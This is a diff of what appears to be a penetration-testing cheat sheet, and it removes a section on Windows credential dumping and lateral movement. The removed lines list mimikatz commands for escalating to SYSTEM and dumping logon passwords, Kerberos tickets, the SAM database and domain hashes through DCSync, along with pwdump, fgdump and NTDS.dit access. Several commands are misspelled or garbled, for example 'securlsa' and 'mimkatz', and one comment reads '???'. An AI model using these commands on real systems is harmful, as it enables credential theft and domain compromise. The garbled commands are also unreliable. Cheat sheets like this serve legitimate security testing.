@@ -681,50 +681,6 @@ $ hashcat -m [hash-type] -a 0 [hash-file] [wordlist] -o cracked.txt
 ```
 
 
-## Active Directory / Lateral Movement
-
-### Dumping Windows LM/HTLM Hashes
-
-Mimikatz.exe
-```
-# Open mimikatz and escalate security token to SYSTEM integrity
-cmd> mimikatz.exe
-mimikatz > privilege::debug
-mimikatz > token::elevate
-
-# Dump creds of all logged-on users using the Securlsa module
-mimikatz > securlsa::logonpasswords
-
-# Dump Ticket Granting Ticket and Ticket Granting Service (kerberos tickets)
-# -> Access resources associated with these tickets OR
-# -> Obtain TGS with a TGT to access specific resources we want to target in the domain.
-mimkatz > seccurlsa::tickets
-
-# Dump contents of SAM database in current host
-mimikatz > lsadump::sam
-
-# Dump contents of ???
-mimikatz > lsadump::dcsync /domain:pentestlab.local /all
-```
-
-Pwdump.exe
-```
-cmd> pwdump.exe localhost
-```
-
-Fgdump.exe (improved pwdump, shutdown firewalls)
-```
-cmd> fgdump.exe localhost
-```
-
-NTDS.dit - Domain Controller
-```
-cmd> type C:\Windows\NTDS\NTDS.dit
-```
-
-
-
-
 ### Pass The Hash
 
 Pass-the-Hash
